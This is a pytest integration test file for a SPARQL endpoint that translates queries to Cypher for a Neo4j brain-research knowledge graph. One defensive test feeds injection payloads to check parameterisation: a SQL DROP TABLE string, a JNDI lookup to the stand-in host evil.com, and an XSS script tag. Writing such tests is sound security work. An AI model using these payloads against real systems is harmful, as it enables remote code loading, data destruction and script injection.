"""
Integration tests for SPARQL Endpoint.

Tests end-to-end SPARQL query processing including translation,
execution against Neo4j, and result formatting.
"""

import json
import os
import time
from unittest.mock import Mock, patch

import pytest
from flask import Flask

from brain_researcher.services.br_kg.sparql.endpoint import SPARQLEndpoint
from brain_researcher.services.br_kg.sparql.translator import SPARQLToCypherTranslator

if os.environ.get("RUN_SPARQL_TESTS") != "1":
    pytest.skip(
        "Set RUN_SPARQL_TESTS=1 to run SPARQL integration tests",
        allow_module_level=True,
    )


class TestSPARQLEndpointIntegration:
    """Integration tests for SPARQL endpoint with real translation"""

    @pytest.fixture
    def mock_neo4j_db(self):
        """Mock Neo4j database with realistic responses"""
        mock_db = Mock()

        # Default response for brain region queries
        mock_db._run.return_value = [
            {
                "subject": {"id": "brain_region_001", "label": "Primary Visual Cortex"},
                "predicate": "ACTIVATES_REGION",
                "object": {"id": "activation_001", "intensity": 0.8},
            },
            {
                "subject": {"id": "brain_region_002", "label": "Motor Cortex"},
                "predicate": "ACTIVATES_REGION",
                "object": {"id": "activation_002", "intensity": 0.6},
            },
        ]

        return mock_db

    @pytest.fixture
    def sparql_endpoint(self, mock_neo4j_db):
        """Create integrated SPARQL endpoint with real translator"""
        # Use real translator instead of mocking
        endpoint = SPARQLEndpoint(
            neo4j_db=mock_neo4j_db,
            base_uri="https://br_kg.org/",
            enable_federation=False,  # Disable federation for integration tests
            query_timeout=10,
            max_results=100,
        )
        return endpoint

    @pytest.fixture
    def app(self, sparql_endpoint):
        """Create Flask app with integrated endpoint"""
        app = Flask(__name__)
        blueprint = sparql_endpoint.create_blueprint()
        app.register_blueprint(blueprint)
        return app

    @pytest.mark.integration
    def test_basic_select_query_integration(self, app, sparql_endpoint, mock_neo4j_db):
        """Test basic SELECT query end-to-end processing"""

        # Mock the SPARQL parsing to return a simple query structure
        with patch(
            "brain_researcher.services.br_kg.sparql.endpoint.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            # Override translator methods to simulate parsing
            sparql_endpoint.translator._extract_select_variables = Mock(
                return_value=["?region", "?activation"]
            )
            sparql_endpoint.translator._extract_where_patterns = Mock(
                return_value=[
                    ("?region", "https://br_kg.org/activatesRegion", "?activation")
                ]
            )
            sparql_endpoint.translator._extract_filters = Mock(return_value=[])
            sparql_endpoint.translator._extract_optional_patterns = Mock(
                return_value=[]
            )
            sparql_endpoint.translator._extract_order_by = Mock(return_value=None)
            sparql_endpoint.translator._extract_limit = Mock(return_value=None)
            sparql_endpoint.translator._extract_offset = Mock(return_value=None)
            sparql_endpoint._get_query_type = Mock(return_value="SELECT")

            with app.test_client() as client:
                response = client.get(
                    "/sparql?query=SELECT ?region ?activation WHERE { ?region <https://br_kg.org/activatesRegion> ?activation }"
                )

                assert response.status_code == 200
                assert response.content_type == "application/sparql-results+json"

                data = json.loads(response.data)
                assert "head" in data
                assert "results" in data
                assert "vars" in data["head"]
                assert "bindings" in data["results"]

                # Verify Neo4j was called with translated Cypher query
                mock_neo4j_db._run.assert_called_once()
                cypher_call = mock_neo4j_db._run.call_args
                cypher_query = cypher_call[0][0]

                # Should contain MATCH and RETURN clauses
                assert "MATCH" in cypher_query
                assert "RETURN" in cypher_query
                assert "ACTIVATES_REGION" in cypher_query

    @pytest.mark.integration
    def test_construct_query_integration(self, app, sparql_endpoint, mock_neo4j_db):
        """Test CONSTRUCT query end-to-end processing"""

        # Configure Neo4j to return triples format
        mock_neo4j_db._run.return_value = [
            {
                "subject": "https://br_kg.org/brain_region_001",
                "predicate": "https://br_kg.org/activatesRegion",
                "object": "https://br_kg.org/activation_001",
            }
        ]

        with patch(
            "brain_researcher.services.br_kg.sparql.endpoint.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            sparql_endpoint.translator._extract_construct_patterns = Mock(
                return_value=[]
            )
            sparql_endpoint.translator._extract_where_patterns = Mock(
                return_value=[
                    ("?region", "https://br_kg.org/activatesRegion", "?activation")
                ]
            )
            sparql_endpoint._get_query_type = Mock(return_value="CONSTRUCT")

            with app.test_client() as client:
                response = client.get(
                    "/sparql?query=CONSTRUCT { ?region <https://br_kg.org/activatesRegion> ?activation } WHERE { ?region <https://br_kg.org/activatesRegion> ?activation }"
                )

                assert response.status_code == 200

                data = json.loads(response.data)
                assert "triples" in data
                assert len(data["triples"]) == 1

                triple = data["triples"][0]
                assert triple["subject"]["type"] == "uri"
                assert triple["predicate"]["type"] == "uri"
                assert triple["object"]["type"] == "uri"

    @pytest.mark.integration
    def test_ask_query_integration(self, app, sparql_endpoint, mock_neo4j_db):
        """Test ASK query end-to-end processing"""

        # Configure Neo4j to return existence result
        mock_neo4j_db._run.return_value = [{"result": True}]

        with patch(
            "brain_researcher.services.br_kg.sparql.endpoint.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            sparql_endpoint.translator._extract_where_patterns = Mock(
                return_value=[
                    ("?region", "https://br_kg.org/activatesRegion", "?activation")
                ]
            )
            sparql_endpoint._get_query_type = Mock(return_value="ASK")

            with app.test_client() as client:
                response = client.get(
                    "/sparql?query=ASK { ?region <https://br_kg.org/activatesRegion> ?activation }"
                )

                assert response.status_code == 200

                data = json.loads(response.data)
                assert "boolean" in data
                assert data["boolean"] is True

                # Verify ASK query was translated to count query
                cypher_call = mock_neo4j_db._run.call_args
                cypher_query = cypher_call[0][0]
                assert "count(*) > 0" in cypher_query
                assert "LIMIT 1" in cypher_query

    @pytest.mark.integration
    def test_complex_select_with_filters(self, app, sparql_endpoint, mock_neo4j_db):
        """Test complex SELECT query with filters and ordering"""

        mock_neo4j_db._run.return_value = [
            {"region": "https://br_kg.org/cortex", "intensity": 0.9},
            {"region": "https://br_kg.org/hippocampus", "intensity": 0.7},
        ]

        with patch(
            "brain_researcher.services.br_kg.sparql.endpoint.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            # Simulate complex query parsing
            sparql_endpoint.translator._extract_select_variables = Mock(
                return_value=["?region", "?intensity"]
            )
            sparql_endpoint.translator._extract_where_patterns = Mock(
                return_value=[
                    ("?region", "https://br_kg.org/hasIntensity", "?intensity")
                ]
            )
            sparql_endpoint.translator._extract_filters = Mock(
                return_value=["?intensity > 0.5"]
            )
            sparql_endpoint.translator._extract_optional_patterns = Mock(
                return_value=[]
            )
            sparql_endpoint.translator._extract_order_by = Mock(
                return_value="DESC(?intensity)"
            )
            sparql_endpoint.translator._extract_limit = Mock(return_value=10)
            sparql_endpoint.translator._extract_offset = Mock(return_value=0)
            sparql_endpoint._get_query_type = Mock(return_value="SELECT")

            # Mock filter translation
            sparql_endpoint.translator._translate_filter = Mock(
                return_value=("intensity > $threshold", {"threshold": 0.5})
            )

            with app.test_client() as client:
                complex_query = """
                SELECT ?region ?intensity WHERE {
                    ?region <https://br_kg.org/hasIntensity> ?intensity .
                    FILTER(?intensity > 0.5)
                }
                ORDER BY DESC(?intensity)
                LIMIT 10
                """

                response = client.get(f"/sparql?query={complex_query}")

                assert response.status_code == 200

                data = json.loads(response.data)
                assert len(data["results"]["bindings"]) == 2

                # Verify complex Cypher was generated
                cypher_call = mock_neo4j_db._run.call_args
                cypher_query = cypher_call[0][0]
                assert "WHERE" in cypher_query
                assert "ORDER BY DESC(?intensity)" in cypher_query
                assert "LIMIT 10" in cypher_query

    @pytest.mark.integration
    def test_query_caching_integration(self, app, sparql_endpoint, mock_neo4j_db):
        """Test query result caching in integration scenario"""

        with patch(
            "brain_researcher.services.br_kg.sparql.endpoint.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            sparql_endpoint.translator._extract_select_variables = Mock(
                return_value=["?s"]
            )
            sparql_endpoint.translator._extract_where_patterns = Mock(
                return_value=[
                    ("?s", "http://www.w3.org/1999/02/22-rdf-syntax-ns#type", "?type")
                ]
            )
            sparql_endpoint.translator._extract_filters = Mock(return_value=[])
            sparql_endpoint.translator._extract_optional_patterns = Mock(
                return_value=[]
            )
            sparql_endpoint.translator._extract_order_by = Mock(return_value=None)
            sparql_endpoint.translator._extract_limit = Mock(return_value=None)
            sparql_endpoint.translator._extract_offset = Mock(return_value=None)
            sparql_endpoint._get_query_type = Mock(return_value="SELECT")

            with app.test_client() as client:
                query = "SELECT ?s WHERE { ?s a ?type }"

                # First request - should hit database
                response1 = client.get(f"/sparql?query={query}")
                assert response1.status_code == 200

                # Second request - should hit cache
                response2 = client.get(f"/sparql?query={query}")
                assert response2.status_code == 200

                # Database should only be called once
                assert mock_neo4j_db._run.call_count == 1

                # Both responses should be identical
                assert response1.data == response2.data

                # Verify cache metrics
                assert sparql_endpoint.query_metrics["total_queries"] == 2
                assert sparql_endpoint.query_metrics["cached_queries"] == 1

    @pytest.mark.integration
    def test_error_handling_integration(self, app, sparql_endpoint, mock_neo4j_db):
        """Test error handling in integration scenario"""

        # Make Neo4j raise an exception
        mock_neo4j_db._run.side_effect = Exception("Database connection failed")

        with patch(
            "brain_researcher.services.br_kg.sparql.endpoint.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            sparql_endpoint._get_query_type = Mock(return_value="SELECT")

            with app.test_client() as client:
                response = client.get("/sparql?query=SELECT * WHERE { ?s ?p ?o }")

                assert response.status_code == 500
                assert b"Query execution error" in response.data

                # Error metrics should be updated
                assert sparql_endpoint.query_metrics["failed_queries"] == 1

    @pytest.mark.integration
    def test_multiple_result_formats_integration(
        self, app, sparql_endpoint, mock_neo4j_db
    ):
        """Test different result format outputs in integration"""

        with patch(
            "brain_researcher.services.br_kg.sparql.endpoint.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            sparql_endpoint.translator._extract_select_variables = Mock(
                return_value=["?s", "?p", "?o"]
            )
            sparql_endpoint.translator._extract_where_patterns = Mock(
                return_value=[("?s", "?p", "?o")]
            )
            sparql_endpoint.translator._extract_filters = Mock(return_value=[])
            sparql_endpoint.translator._extract_optional_patterns = Mock(
                return_value=[]
            )
            sparql_endpoint.translator._extract_order_by = Mock(return_value=None)
            sparql_endpoint.translator._extract_limit = Mock(return_value=None)
            sparql_endpoint.translator._extract_offset = Mock(return_value=None)
            sparql_endpoint._get_query_type = Mock(return_value="SELECT")

            with app.test_client() as client:
                query = "SELECT * WHERE { ?s ?p ?o }"

                # Test JSON format
                response_json = client.get(
                    f"/sparql?query={query}",
                    headers={"Accept": "application/sparql-results+json"},
                )
                assert response_json.status_code == 200
                assert response_json.content_type == "application/sparql-results+json"
                json.loads(response_json.data)  # Should be valid JSON

                # Test XML format
                response_xml = client.get(
                    f"/sparql?query={query}",
                    headers={"Accept": "application/sparql-results+xml"},
                )
                assert response_xml.status_code == 200
                assert response_xml.content_type == "application/sparql-results+xml"
                assert b"<?xml" in response_xml.data

    @pytest.mark.integration
    def test_performance_metrics_integration(self, app, sparql_endpoint, mock_neo4j_db):
        """Test performance metrics collection in integration scenario"""

        # Add artificial delay to simulate query execution time
        def slow_query(*args, **kwargs):
            time.sleep(0.1)  # 100ms delay
            return [{"result": "test"}]

        mock_neo4j_db._run.side_effect = slow_query

        with patch(
            "brain_researcher.services.br_kg.sparql.endpoint.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            sparql_endpoint._get_query_type = Mock(return_value="SELECT")
            sparql_endpoint.translator._extract_select_variables = Mock(
                return_value=["?s"]
            )
            sparql_endpoint.translator._extract_where_patterns = Mock(
                return_value=[("?s", "?p", "?o")]
            )
            sparql_endpoint.translator._extract_filters = Mock(return_value=[])
            sparql_endpoint.translator._extract_optional_patterns = Mock(
                return_value=[]
            )
            sparql_endpoint.translator._extract_order_by = Mock(return_value=None)
            sparql_endpoint.translator._extract_limit = Mock(return_value=None)
            sparql_endpoint.translator._extract_offset = Mock(return_value=None)

            with app.test_client() as client:
                # Execute a few queries
                for i in range(3):
                    response = client.get(
                        f"/sparql?query=SELECT * WHERE {{ ?s ?p ?o{i} }}"
                    )
                    assert response.status_code == 200

                # Check metrics endpoint
                metrics_response = client.get("/sparql/metrics")
                assert metrics_response.status_code == 200

                metrics = json.loads(metrics_response.data)
                assert metrics["total_queries"] == 3
                assert (
                    metrics["avg_execution_time"] > 0.05
                )  # Should reflect the artificial delay
                assert metrics["failed_queries"] == 0


class TestSPARQLTranslatorIntegration:
    """Integration tests for SPARQL translator with realistic scenarios"""

    @pytest.fixture
    def translator(self):
        return SPARQLToCypherTranslator(base_uri="https://br_kg.org/")

    @pytest.mark.integration
    def test_neuroimaging_query_translation(self, translator):
        """Test translation of neuroimaging-specific SPARQL queries"""

        with patch(
            "brain_researcher.services.br_kg.sparql.translator.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            # Mock a brain activation query
            translator._get_query_type = Mock(return_value="SELECT")
            translator._extract_select_variables = Mock(
                return_value=["?region", "?task", "?activation"]
            )
            translator._extract_where_patterns = Mock(
                return_value=[
                    ("?region", "https://br_kg.org/activatedBy", "?task"),
                    ("?region", "https://br_kg.org/hasActivation", "?activation"),
                ]
            )
            translator._extract_filters = Mock(return_value=[])
            translator._extract_optional_patterns = Mock(return_value=[])
            translator._extract_order_by = Mock(return_value=None)
            translator._extract_limit = Mock(return_value=10)
            translator._extract_offset = Mock(return_value=None)

            cypher_query, params = translator.translate_query(mock_parsed)

            # Verify neuroimaging predicates are mapped correctly
            assert "ACTIVATED_BY" in cypher_query or "ACTIVATEDBY" in cypher_query
            assert "HAS_ACTIVATION" in cypher_query or "HASACTIVATION" in cypher_query
            assert "LIMIT 10" in cypher_query
            assert "MATCH" in cypher_query
            assert "RETURN" in cypher_query

    @pytest.mark.integration
    def test_brain_region_hierarchy_query(self, translator):
        """Test translation of hierarchical brain region queries"""

        with patch(
            "brain_researcher.services.br_kg.sparql.translator.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            # Mock a hierarchical query
            translator._get_query_type = Mock(return_value="SELECT")
            translator._extract_select_variables = Mock(
                return_value=["?region", "?parent"]
            )
            translator._extract_where_patterns = Mock(
                return_value=[
                    ("?region", "https://br_kg.org/partOf", "?parent"),
                    (
                        "?parent",
                        "http://www.w3.org/1999/02/22-rdf-syntax-ns#type",
                        "https://br_kg.org/BrainRegion",
                    ),
                ]
            )
            translator._extract_filters = Mock(return_value=[])
            translator._extract_optional_patterns = Mock(return_value=[])
            translator._extract_order_by = Mock(return_value=None)
            translator._extract_limit = Mock(return_value=None)
            translator._extract_offset = Mock(return_value=None)

            cypher_query, params = translator.translate_query(mock_parsed)

            # Verify hierarchical relationships are translated
            assert "PART_OF" in cypher_query
            assert "TYPE" in cypher_query
            assert len(params) > 0  # Should have parameters for URIs

    @pytest.mark.integration
    def test_complex_construct_query_translation(self, translator):
        """Test translation of complex CONSTRUCT queries"""

        with patch(
            "brain_researcher.services.br_kg.sparql.translator.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            translator._get_query_type = Mock(return_value="CONSTRUCT")
            translator._extract_construct_patterns = Mock(
                return_value=[
                    ("?study", "https://br_kg.org/hasResult", "?result"),
                    ("?result", "https://br_kg.org/activatesRegion", "?region"),
                ]
            )
            translator._extract_where_patterns = Mock(
                return_value=[
                    ("?study", "https://br_kg.org/usesTask", "?task"),
                    (
                        "?task",
                        "http://www.w3.org/2000/01/rdf-schema#label",
                        '"working memory"',
                    ),
                ]
            )

            cypher_query, params = translator.translate_query(mock_parsed)

            # Verify CONSTRUCT query structure
            assert "MATCH" in cypher_query
            assert "RETURN subject, predicate, object" in cypher_query
            assert "USES_TASK" in cypher_query

            # Should handle literal constraint
            assert len(params) > 0
            assert "working memory" in str(params.values())

    @pytest.mark.integration
    def test_multilingual_literal_handling(self, translator):
        """Test handling of multilingual and typed literals"""

        # Test various literal patterns
        patterns = [
            ("?region", "http://www.w3.org/2000/01/rdf-schema#label", '"cortex"@en'),
            (
                "?region",
                "https://br_kg.org/volume",
                '"1250.5"^^<http://www.w3.org/2001/XMLSchema#float>',
            ),
            ("?region", "https://br_kg.org/description", '"région cérébrale"@fr'),
        ]

        for pattern in patterns:
            match_clause, where_clause, params = translator._translate_triple_pattern(
                pattern
            )

            # Literals should be handled as property constraints
            assert len(params) > 0

            # Check that literal values are extracted correctly
            literal_value = list(params.values())[0]
            if pattern[2] == '"cortex"@en':
                assert "cortex" in literal_value
            elif pattern[2] == '"1250.5"^^<http://www.w3.org/2001/XMLSchema#float>':
                assert "1250.5" in literal_value
            elif pattern[2] == '"région cérébrale"@fr':
                assert "région cérébrale" in literal_value

    @pytest.mark.integration
    def test_parameter_injection_prevention(self, translator):
        """Test prevention of parameter injection attacks"""

        # Potentially malicious patterns
        malicious_patterns = [
            ("?s", "https://br_kg.org/test", '"; DROP TABLE nodes; --"'),
            ("?s", "https://br_kg.org/test", '"${jndi:ldap://evil.com}"'),
            ("?s", "https://br_kg.org/test", '"<script>alert(1)</script>"'),
        ]

        for pattern in malicious_patterns:
            match_clause, where_clause, params = translator._translate_triple_pattern(
                pattern
            )

            # Values should be properly parameterized
            assert "${" not in match_clause or "${" in where_clause  # Parameterized
            assert "DROP TABLE" not in match_clause
            assert "script>" not in match_clause

            # Parameters should contain the full literal value
            if params:
                param_value = list(params.values())[0]
                assert isinstance(param_value, str)

    @pytest.mark.integration
    def test_large_query_handling(self, translator):
        """Test handling of large complex queries"""

        with patch(
            "brain_researcher.services.br_kg.sparql.translator.parseQuery"
        ) as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed

            # Mock large query with many patterns
            large_patterns = []
            for i in range(50):  # 50 triple patterns
                large_patterns.append(
                    (f"?s{i}", f"https://br_kg.org/pred{i}", f"?o{i}")
                )

            translator._get_query_type = Mock(return_value="SELECT")
            translator._extract_select_variables = Mock(
                return_value=[f"?s{i}" for i in range(50)]
            )
            translator._extract_where_patterns = Mock(return_value=large_patterns)
            translator._extract_filters = Mock(return_value=[])
            translator._extract_optional_patterns = Mock(return_value=[])
            translator._extract_order_by = Mock(return_value=None)
            translator._extract_limit = Mock(return_value=None)
            translator._extract_offset = Mock(return_value=None)

            # Should handle large query without errors
            cypher_query, params = translator.translate_query(mock_parsed)

            assert isinstance(cypher_query, str)
            assert len(cypher_query) > 100  # Should be a substantial query
            assert "MATCH" in cypher_query
            assert "RETURN" in cypher_query

    @pytest.mark.integration
    def test_concurrent_translation_safety(self, translator):
        """Test thread safety of translator under concurrent use"""
        import threading
        import time

        results = []
        errors = []

        def translate_worker(worker_id):
            try:
                with patch(
                    "brain_researcher.services.br_kg.sparql.translator.parseQuery"
                ) as mock_parse:
                    mock_parsed = Mock()
                    mock_parse.return_value = mock_parsed

                    translator._get_query_type = Mock(return_value="SELECT")
                    translator._extract_select_variables = Mock(
                        return_value=[f"?var{worker_id}"]
                    )
                    translator._extract_where_patterns = Mock(
                        return_value=[
                            (
                                f"?s{worker_id}",
                                f"https://br_kg.org/pred{worker_id}",
                                f"?o{worker_id}",
                            )
                        ]
                    )
                    translator._extract_filters = Mock(return_value=[])
                    translator._extract_optional_patterns = Mock(return_value=[])
                    translator._extract_order_by = Mock(return_value=None)
                    translator._extract_limit = Mock(return_value=None)
                    translator._extract_offset = Mock(return_value=None)

                    # Small delay to increase chance of race conditions
                    time.sleep(0.01)

                    cypher_query, params = translator.translate_query(mock_parsed)
                    results.append((worker_id, cypher_query, params))

            except Exception as e:
                errors.append((worker_id, str(e)))

        # Run 10 concurrent translations
        threads = []
        for i in range(10):
            thread = threading.Thread(target=translate_worker, args=(i,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # Should have no errors and correct number of results
        assert len(errors) == 0, f"Translation errors: {errors}"
        assert len(results) == 10

        # Each result should be unique (no cross-contamination)
        for worker_id, query, params in results:
            assert f"var{worker_id}" in query or f"s{worker_id}" in query
            assert f"pred{worker_id}" in query


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
